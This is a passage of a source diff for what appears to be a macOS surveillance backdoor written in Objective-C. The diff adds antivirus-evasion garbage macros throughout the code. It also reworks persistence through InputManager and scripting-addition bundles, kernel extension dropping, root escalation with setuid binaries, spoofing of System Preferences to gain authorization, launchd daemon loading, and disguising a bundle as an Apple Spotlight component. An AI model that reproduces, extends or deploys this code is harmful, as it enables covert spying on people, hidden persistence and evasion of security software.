                               gKext32Name];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"Contents"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"Contents/Resources"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"Contents/MacOS"];
       mkdir([_backdoorContentPath UTF8String], 0755);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                               [[NSBundle mainBundle] bundlePath],
                               gKext32Name,
                               @"/Contents/Info.plist"];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
 
   NSString *tempKextDir;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (is64bitKernel())
     {
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
@@ -1756,7 +2014,10 @@ void lionSendEventToPid(pid_t pidP)
                               gKext64Name,
                               @"/Contents/MacOS",
                               gKext64Name];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                      [[NSBundle mainBundle] bundlePath],
                      gKext64Name];
@@ -1768,7 +2029,10 @@ void lionSendEventToPid(pid_t pidP)
                               gKext32Name,
                               @"/Contents/MacOS",
                               gKext32Name];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                      [[NSBundle mainBundle] bundlePath],
                      gKext32Name];
@@ -1782,7 +2046,10 @@ void lionSendEventToPid(pid_t pidP)
   [[NSFileManager defaultManager] moveItemAtPath: tempKextDir
                                           toPath: _backdoorContentPath
                                            error: nil];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [tempKextDir release];
   [taskOutput release];
 
@@ -1796,7 +2063,9 @@ void lionSendEventToPid(pid_t pidP)
     {
       _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
                               [[NSBundle mainBundle] bundlePath],
-                              gKext32Name];
+                              gKext32Name];  
+      // AV evasion: only on release build
+      AV_GARBAGE_002
     }
   NSArray *arguments = [NSArray arrayWithObjects:
                         @"-R",
@@ -1806,7 +2075,10 @@ void lionSendEventToPid(pid_t pidP)
   [gUtil executeTask: @"/usr/sbin/chown"
        withArguments: arguments
         waitUntilEnd: YES];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   //
   // Backdoor .app Info.plist
   //
@@ -1828,6 +2100,9 @@ void lionSendEventToPid(pid_t pidP)
                                                        format: NSPropertyListXMLFormat_v1_0
                                              errorDescription: nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   _backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           @"Contents/Info.plist"];
@@ -1843,12 +2118,18 @@ void lionSendEventToPid(pid_t pidP)
 }
 
 - (void)_resizeSharedMemoryWindow
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if (getuid() == 0 || geteuid() == 0)
     {
 #ifdef DEBUG_CORE
       warnLog(@"High Privs mode, big shared memory");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       //
       // Let's change the default shared memory max size to a better value
@@ -1861,6 +2142,9 @@ void lionSendEventToPid(pid_t pidP)
       [gUtil executeTask: @"/usr/sbin/sysctl"
            withArguments: _arguments
             waitUntilEnd: YES];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
       _arguments = [NSArray arrayWithObjects:
                     @"-w",
@@ -1892,22 +2176,34 @@ void lionSendEventToPid(pid_t pidP)
 }
 
 - (BOOL)_createAndInitSharedMemory
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
   key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   // init shared memory
-  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
+  gSharedMemoryCommand = [[__m_MSharedMemory alloc] initWithKey: memKeyForCommand
                                                           size: gMemCommandMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
-
-  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  gSharedMemoryLogging = [[__m_MSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
   
   // on backdoor startup try to remove mapped file
   [gSharedMemoryCommand removeMappedFile];
   [gSharedMemoryLogging removeMappedFile];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   //
   // Create and initialize the shared memory segments
@@ -1928,7 +2224,13 @@ void lionSendEventToPid(pid_t pidP)
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [gSharedMemoryCommand zeroFillMemory];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if ([gSharedMemoryLogging createMemoryRegion] == -1)
     {
@@ -1938,6 +2240,9 @@ void lionSendEventToPid(pid_t pidP)
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if ([gSharedMemoryLogging attachToMemoryRegion] == -1)
     {
 #ifdef DEBUG_CORE
@@ -1946,13 +2251,19 @@ void lionSendEventToPid(pid_t pidP)
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [gSharedMemoryLogging zeroFillMemory];
   
   return YES;
 }
 
 - (void)_checkForOthers
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   //
   // Avoid to create the NSPort if we're running from a different name in order
   // to perform the UI spoofing (e.g. System Preferences) otherwise we'll lock
@@ -1964,6 +2275,9 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
       infoLog(@"Registering NSPort to NameServer");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       //
       // Check if there's another backdoor running
@@ -1997,9 +2311,15 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
   infoLog(@"sliPlist mode");
 #endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (getuid() != 0 && geteuid() != 0)
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                                isDirectory: NULL])
         {
@@ -2013,9 +2333,12 @@ void lionSendEventToPid(pid_t pidP)
       else
         {
           if ([self getRootThroughSLI] == YES)
-            {
+          {  
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
               [gUtil dropExecFlag];
-            }
+          }
         }
     }
   else
@@ -2028,6 +2351,9 @@ void lionSendEventToPid(pid_t pidP)
       infoLog(@"sli mode success");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
       return YES;
     }
@@ -2036,7 +2362,10 @@ void lionSendEventToPid(pid_t pidP)
 }
 
 - (BOOL)_UISpoof
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (getuid() != 0 && geteuid() != 0)
     {
       // Check the application executable name, if different than
@@ -2056,11 +2385,17 @@ void lionSendEventToPid(pid_t pidP)
                                     [[NSBundle mainBundle] bundlePath],
                                     mBinaryName, @".ez"];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           [@"" writeToFile: tempFileName
                 atomically: YES
                   encoding: NSUTF8StringEncoding error: nil];
                   
           [tempFileName release];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
           
           [self _renameBackdoorAndRelaunch];
         }
@@ -2073,6 +2408,9 @@ void lionSendEventToPid(pid_t pidP)
     {
       if ([mBinaryName isEqualToString: @"System Preferences"])
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           [gUtil enableSetugidAuth];
           usleep(10000);
           [self UISudoWhileAlreadyAuthorized: YES];
@@ -2083,18 +2421,19 @@ void lionSendEventToPid(pid_t pidP)
       NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"mdworker.flg"];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                 isDirectory: NO])
         {
           [gUtil dropExecFlag];
           
-          NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                                     [[[[[NSBundle mainBundle] bundlePath]
-                                        stringByDeletingLastPathComponent]
-                                       stringByDeletingLastPathComponent]
-                                      stringByDeletingLastPathComponent],
-                                     BACKDOOR_DAEMON_PLIST];
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
+          NSString *backdoorPlist = createLaunchdPlistPath();
           
           NSArray *arguments = [NSArray arrayWithObjects:
                                 @"load",
@@ -2102,6 +2441,9 @@ void lionSendEventToPid(pid_t pidP)
                                 @"Aqua",
                                 backdoorPlist,
                                 nil];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
           
           [gUtil executeTask: @"/bin/launchctl"
                withArguments: arguments
@@ -2116,71 +2458,81 @@ void lionSendEventToPid(pid_t pidP)
   return NO;
 }
 
+- (BOOL)createFolder:(NSString*)pathName
+{
+  NSFileManager *fm = [NSFileManager defaultManager];
+  
+  return [fm createDirectoryAtPath:pathName 
+       withIntermediateDirectories:YES 
+                        attributes:nil 
+                             error:nil];
+}
+
+- (BOOL)createIMFolderTree
+{
+  NSString *imResources = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/%@", 
+                                                      LIBRARY_NSSTRING, 
+                                                      IM_FOLDER,
+                                                      IM_NAME,
+                                                      IM_NAME,
+                                                      IM_EXT,
+                                                      IM_CONTENTS,
+                                                      IM_RESOURCES];
+  
+  NSString *imMacos = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/%@", 
+                                                 LIBRARY_NSSTRING, 
+                                                 IM_FOLDER,
+                                                 IM_NAME,
+                                                 IM_NAME,
+                                                 IM_EXT,
+                                                 IM_CONTENTS
+                                                 IM_MACOS];
+  
+  if ([self createFolder: imResources] == FALSE)
+    return FALSE;
+  
+  if ([self createFolder: imMacos] == FALSE)
+    return FALSE;
+  
+  return TRUE;
+}
+
 - (BOOL)_dropInputManager
 {
   NSString *err;
-  NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
-                                    [[NSBundle mainBundle] bundlePath],
-                                    @"Contents"];
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/InputManagers/appleHID"])
-    {
-      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
-                                                 error: nil];
-    }
-
-  //
-  // Input Manager
-  //
-  if (mkdir("/Library/InputManagers", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir InputManagers (%d)", errno);
-#endif
-      return NO;
-    }
-  if (mkdir("/Library/InputManagers/appleHID", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir appleHID (%d)", errno);
-#endif
-      return NO;
-    }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir appleHID.bundle (%d)", errno);
-#endif
-      return NO;
-    }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir Contents (%d)", errno);
-#endif
-      return NO;
-    }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir MacOS (%d)", errno);
-#endif
-      return NO;
-    }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755) == -1 && errno != EEXIST)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error mkdir Resources (%d)", errno);
-#endif
-      return NO;
-    }
-
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  NSString *_backdoorContentPath;
+  
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/InputManagers/appleHID"])
+//    {
+//      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
+//                                                 error: nil];
+//    }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  if ([self createIMFolderTree] == FALSE)
+    return FALSE;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableDictionary *rootObj2 = [NSMutableDictionary dictionaryWithCapacity: 4];
   NSMutableDictionary *innerDict2 = [NSMutableDictionary dictionaryWithCapacity: 1];
+  
   [innerDict2 setObject: gInputManagerName
                  forKey: @"English"];
   
-  [rootObj2 setObject: @"appleHID.bundle"
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  NSString *imBundleName = [NSString stringWithFormat: @"%@.%@", IM_NAME, IM_EXT];
+  
+  [rootObj2 setObject: imBundleName
                forKey: @"BundleName"];
   [rootObj2 setObject: @"YES"
                forKey: @"LoadBundleOnLaunch"];
@@ -2193,18 +2545,33 @@ void lionSendEventToPid(pid_t pidP)
                                                                format: NSPropertyListXMLFormat_v1_0
                                                      errorDescription: &err];
   
-  [binData writeToFile: @"/Library/InputManagers/appleHID/Info"
+  NSString *imFolderInfo = [NSString stringWithFormat:@"/%@/%@/%@/Info" , 
+                                                      LIBRARY_NSSTRING, 
+                                                      IM_FOLDER, 
+                                                      IM_NAME];
+  
+  [binData writeToFile: imFolderInfo
             atomically: YES];
   
-  NSString *destDir = [[NSString alloc] initWithFormat:
-                       @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
-                       EXT_BUNDLE_FOLDER,
-                       EXT_BUNDLE_FOLDER,
-                       gInputManagerName];
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
-  NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
-                         [[NSBundle mainBundle] bundlePath],
-                         gInputManagerName];
+  NSString *destDir = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/%@/%@",  
+                                                 LIBRARY_NSSTRING, 
+                                                 IM_FOLDER, 
+                                                 IM_NAME, 
+                                                 IM_NAME, 
+                                                 IM_EXT, 
+                                                 IM_CONTENTS, 
+                                                 IM_MACOS, 
+                                                 gInputManagerName];
+  
+  NSString *tempIMDir = [[NSString alloc] initWithFormat:@"%@/%@",
+                                                         [[NSBundle mainBundle] bundlePath],
+                                                         gInputManagerName];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                            isDirectory: NO] == NO)
@@ -2221,9 +2588,12 @@ void lionSendEventToPid(pid_t pidP)
   //
   NSMutableDictionary *rootObj   = [NSMutableDictionary dictionaryWithCapacity: 7];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
   [rootObj setObject: gInputManagerName forKey: @"CFBundleExecutable"];
-  [rootObj setObject: @"com.apple.spotlight-worker" forKey: @"CFBundleIdentifier"];
+  [rootObj setObject: @"com.apple.spotlight-ui" forKey: @"CFBundleIdentifier"];
   [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
   [rootObj setObject: @"BNDL" forKey: @"CFBundlePackageType"];
   [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
@@ -2233,10 +2603,15 @@ void lionSendEventToPid(pid_t pidP)
                                                        format: NSPropertyListXMLFormat_v1_0
                                              errorDescription: nil];
   
-  _backdoorContentPath = [NSString stringWithFormat:
-                          @"/Library/InputManagers/%@/%@.bundle/Contents/Info.plist",
-                          EXT_BUNDLE_FOLDER,
-                          EXT_BUNDLE_FOLDER];
+  _backdoorContentPath = [NSString stringWithFormat:@"/%@/%@/%@/%@.%@/%@/Info.plist",  
+                                                    LIBRARY_NSSTRING, 
+                                                    IM_FOLDER, 
+                                                    IM_NAME, 
+                                                    IM_NAME, 
+                                                    IM_EXT, 
+                                                    IM_CONTENTS];
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
@@ -2246,6 +2621,10 @@ void lionSendEventToPid(pid_t pidP)
                         @"root:admin",
                         destDir,
                         nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [gUtil executeTask: @"/usr/sbin/chown"
         withArguments: arguments
          waitUntilEnd: YES];
@@ -2254,20 +2633,54 @@ void lionSendEventToPid(pid_t pidP)
   return YES;
 }
 
+- (BOOL)createOXFolderTree:(NSString*)pathName
+{
+  NSString *oxResources = [NSString stringWithFormat:@"%@/%@/%@", 
+                           pathName,
+                           IM_CONTENTS,
+                           IM_RESOURCES];
+  
+  NSString *oxMacos = [NSString stringWithFormat:@"%@/%@/%@", 
+                       pathName, 
+                       IM_CONTENTS,
+                       IM_MACOS];
+  
+  if ([self createFolder: oxResources] == FALSE)
+    return FALSE;
+  
+  if ([self createFolder: oxMacos] == FALSE)
+    return FALSE;
+  
+  return TRUE;
+}
+
 - (void)_dropOsaxBundle
 {
   NSString *osaxRootPath = nil;
   
+  // Only for upgrade from old version...
+  removeAppleHID();
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+
   if (getuid() == 0 || geteuid() == 0) 
-    {
-      osaxRootPath = [[NSString alloc] initWithFormat: @"/%@", OSAX_ROOT_PATH];
-
+    {      
+      osaxRootPath = [[NSString alloc] initWithFormat: @"/%@/%@/%@", LIBRARY_NSSTRING, OSAX_FOLDER, OSAX_NAME];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       // i'm root: remove old low privs osax from user folders
-      NSString *osaxLowPrivsPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@",
+      NSString *osaxLowPrivsPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@/%@",
                                                       NSUserName(),
-                                                      OSAX_ROOT_PATH,
-                                                      EXT_BUNDLE_FOLDER];
-
+                                                      LIBRARY_NSSTRING, 
+                                                      OSAX_FOLDER, 
+                                                      OSAX_NAME];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       if ([[NSFileManager defaultManager] fileExistsAtPath: osaxLowPrivsPath])
         {
           [[NSFileManager defaultManager] removeItemAtPath: osaxLowPrivsPath
@@ -2277,74 +2690,79 @@ void lionSendEventToPid(pid_t pidP)
     }
   else
     {
-      osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
-                                                       NSUserName(),
-                                                       OSAX_ROOT_PATH];
+      osaxRootPath = [[NSString alloc] initWithFormat:@"/Users/%@/%@/%@/%@",
+                                                      NSUserName(),
+                                                      LIBRARY_NSSTRING, 
+                                                      OSAX_FOLDER,
+                                                      OSAX_NAME];
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if (![[NSFileManager defaultManager] fileExistsAtPath: osaxRootPath])
     {
       [[NSFileManager defaultManager] createDirectoryAtPath: osaxRootPath 
-                                withIntermediateDirectories: NO 
+                                withIntermediateDirectories: YES 
                                                  attributes: nil 
                                                       error: nil];
     }
-  
-  NSMutableString *osaxPath = [[NSMutableString alloc] initWithFormat: @"%@/%@",
-                                                                        osaxRootPath,
-                                                                        EXT_BUNDLE_FOLDER];
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: osaxPath])
-    {
-      [[NSFileManager defaultManager] removeItemAtPath: osaxPath
-                                                 error: nil];
-    }
-  
-  // Scripting folder
-  mkdir([osaxRootPath UTF8String], 0755);
-  mkdir([osaxPath UTF8String], 0755);
-  
-  [osaxPath appendString: @"/Contents"];
-  mkdir([osaxPath UTF8String], 0755);
-  
-  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/MacOS", osaxPath];
-  mkdir([tmpPath UTF8String], 0755);
-  [tmpPath release];
-  
-  [osaxPath appendString: @"/Resources"];
-  mkdir([osaxPath UTF8String], 0755);
 
-  NSString *destDir = [[NSString alloc] initWithFormat:
-                       @"%@/%@/Contents/MacOS/%@",
-                       osaxRootPath,
-                       EXT_BUNDLE_FOLDER,
-                       gInputManagerName];
-  [osaxPath release];
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+
+  if ([self createOXFolderTree: osaxRootPath] == NO)
+    return;
+  
+#ifdef DEBUG_CORE
+      infoLog(@"creating OXFolderTree done");
+#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSString *destDir = [[NSString alloc] initWithFormat:@"%@/%@/%@/%@", 
+                                                       osaxRootPath, 
+                                                       IM_CONTENTS, 
+                                                       IM_MACOS, 
+                                                       gInputManagerName];
   
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gInputManagerName];
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
-                                           isDirectory: NO] == NO)
-    {
-      [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
-                                              toPath: destDir
-                                               error: nil];
-    }
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
+  NSError *err;
+  
+  if ([[NSFileManager defaultManager] removeItemAtPath:destDir error: &err] == NO)
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"error removing osax bin %@", err);
+#endif 
+  }
+  
+  [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
+                                          toPath: destDir
+                                           error: nil];
   [tempIMDir release];
   [destDir release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
 
-  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
+  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"_place_on_" 
                                                               withString: gInputManagerName];
 
   NSString *infoPath = [NSString stringWithFormat:
-                        @"%@/%@/Contents/Info.plist",
-                        osaxRootPath,
-                        EXT_BUNDLE_FOLDER];
+                        @"%@/%@/Info.plist",
+                        osaxRootPath, IM_CONTENTS];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [info_pl writeToFile: infoPath
             atomically: NO
@@ -2354,12 +2772,14 @@ void lionSendEventToPid(pid_t pidP)
   [info_pl release];
   [info_orig_pl release];
   
-  NSString *resource_r = [[NSString alloc] initWithCString: RCSMInputManager_r];
+  NSString *resource_r = [[NSString alloc] initWithCString: inputManager_r];
   
   NSString *rPath = [NSString stringWithFormat:
-                     @"%@/%@/Contents/Resources/appleOsax.r",
-                     osaxRootPath,
-                     EXT_BUNDLE_FOLDER];
+                     @"%@/%@/%@/%@.r",
+                     osaxRootPath, IM_CONTENTS, IM_RESOURCES, OSAX_NAME];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [resource_r writeToFile: rPath
                atomically: NO
@@ -2370,111 +2790,114 @@ void lionSendEventToPid(pid_t pidP)
   [osaxRootPath release];
 }
 
-- (void)_dropXPCBundle
-{
-  NSMutableString *xpcPath = [[NSMutableString alloc]
-                              initWithFormat: 
-                              @"%@/",
-                              XPC_BUNDLE_FRAMEWORK_PATH];
-  
-  if (![[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"creating folder %@ for xpc services", xpcPath);
-#endif
-      mkdir([xpcPath UTF8String], 0755);
-    }
-  
-  [xpcPath appendString: XPC_BUNDLE_FOLDER_PREFIX];
-  [xpcPath appendString: gMyXPCName];
-  [xpcPath appendString: @".xpc"];
-  
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service folder %@", xpcPath);
-#endif
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
-    [[NSFileManager defaultManager] removeItemAtPath: xpcPath
-                                               error: nil];
-   
-  // .xpc folder
-  mkdir([xpcPath UTF8String], 0755);
-  
-  // Contents
-  [xpcPath appendString: @"/Contents"];
-  mkdir([xpcPath UTF8String], 0755);
-  
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service folder %@", xpcPath);
-#endif
-  
-  NSString *info_orig_pl = [[NSString alloc] initWithCString: xpc_info_plist];
-  
-#ifdef DEBUG_CORE
-  //infoLog(@"Original info.plist for xpc %@", info_orig_pl);
-#endif
-  
-//  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMXPCService" 
-//                                                              withString: gMyXPCName];
-  
-#ifdef DEBUG_CORE
-  //infoLog(@"info.plist for xpc %@", info_pl);
-#endif
-  
-  NSString *infoPath = [[NSString alloc] initWithFormat: @"%@/Info.plist", xpcPath];
- 
-#ifdef DEBUG_CORE
-  infoLog(@"info.plist for xpc %@", infoPath);
-#endif
-  
-  //[info_pl
-  [info_orig_pl writeToFile: infoPath
-                 atomically: YES
-                   encoding: NSUTF8StringEncoding
-                      error: NULL];
-  
-  //[info_pl release];
-  [info_orig_pl release];
-  [infoPath release];
-  
-  // Resources
-  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/Resources", xpcPath];
-  mkdir([tmpPath UTF8String], 0755);
-  [tmpPath release];
-  
-  // MacOS
-  [xpcPath appendString: @"/MacOS"];
-  mkdir([xpcPath UTF8String], 0755);
-
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service folder %@", xpcPath);
-#endif
-  
-  // Macho name
-  NSString *destXPCMacho = [[NSString alloc] initWithFormat:
-                            @"%@/%@%@",
-                            xpcPath,
-                            XPC_BUNDLE_FOLDER_PREFIX,
-                            gMyXPCName];
-  
-  NSString *origXPCMacho = [[NSString alloc] initWithFormat: @"%@/%@",
-                            [[NSBundle mainBundle] bundlePath],
-                            gXPCName];
- 
-#ifdef DEBUG_CORE
-  infoLog(@"xpc service files: orig %@, dest %@", origXPCMacho, destXPCMacho);
-#endif
-
-  [[NSFileManager defaultManager] copyItemAtPath: origXPCMacho
-                                          toPath: destXPCMacho
-                                           error: nil];
-  
-  [origXPCMacho release];
-  [destXPCMacho release];
-}
+//- (void)_dropXPCBundle
+//{
+//  NSMutableString *xpcPath = [[NSMutableString alloc]
+//                              initWithFormat: 
+//                              @"%@/",
+//                              XPC_BUNDLE_FRAMEWORK_PATH];
+//  
+//  if (![[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
+//    {
+//#ifdef DEBUG_CORE
+//      infoLog(@"creating folder %@ for xpc services", xpcPath);
+//#endif
+//      mkdir([xpcPath UTF8String], 0755);
+//    }
+//  
+//  [xpcPath appendString: XPC_BUNDLE_FOLDER_PREFIX];
+//  [xpcPath appendString: gMyXPCName];
+//  [xpcPath appendString: @".xpc"];
+//  
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service folder %@", xpcPath);
+//#endif
+//  
+//  if ([[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
+//    [[NSFileManager defaultManager] removeItemAtPath: xpcPath
+//                                               error: nil];
+//   
+//  // .xpc folder
+//  mkdir([xpcPath UTF8String], 0755);
+//  
+//  // Contents
+//  [xpcPath appendString: @"/Contents"];
+//  mkdir([xpcPath UTF8String], 0755);
+//  
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service folder %@", xpcPath);
+//#endif
+//  
+//  NSString *info_orig_pl = [[NSString alloc] initWithCString: xpc_info_plist];
+//  
+//#ifdef DEBUG_CORE
+//  //infoLog(@"Original info.plist for xpc %@", info_orig_pl);
+//#endif
+//  
+////  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMXPCService" 
+////                                                              withString: gMyXPCName];
+//  
+//#ifdef DEBUG_CORE
+//  //infoLog(@"info.plist for xpc %@", info_pl);
+//#endif
+//  
+//  NSString *infoPath = [[NSString alloc] initWithFormat: @"%@/Info.plist", xpcPath];
+// 
+//#ifdef DEBUG_CORE
+//  infoLog(@"info.plist for xpc %@", infoPath);
+//#endif
+//  
+//  //[info_pl
+//  [info_orig_pl writeToFile: infoPath
+//                 atomically: YES
+//                   encoding: NSUTF8StringEncoding
+//                      error: NULL];
+//  
+//  //[info_pl release];
+//  [info_orig_pl release];
+//  [infoPath release];
+//  
+//  // Resources
+//  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/Resources", xpcPath];
+//  mkdir([tmpPath UTF8String], 0755);
+//  [tmpPath release];
+//  
+//  // MacOS
+//  [xpcPath appendString: @"/MacOS"];
+//  mkdir([xpcPath UTF8String], 0755);
+//
+//#ifdef DEBUG_CORE
+//  infoLog(@"xpc service folder %@", xpcPath);
+//#endif
+//  
+//  // Macho name
+//  NSString *destXPCMacho = [[NSString alloc] initWithFormat:
+//                            @"%@/%@%@",
+//                            xpcPath,
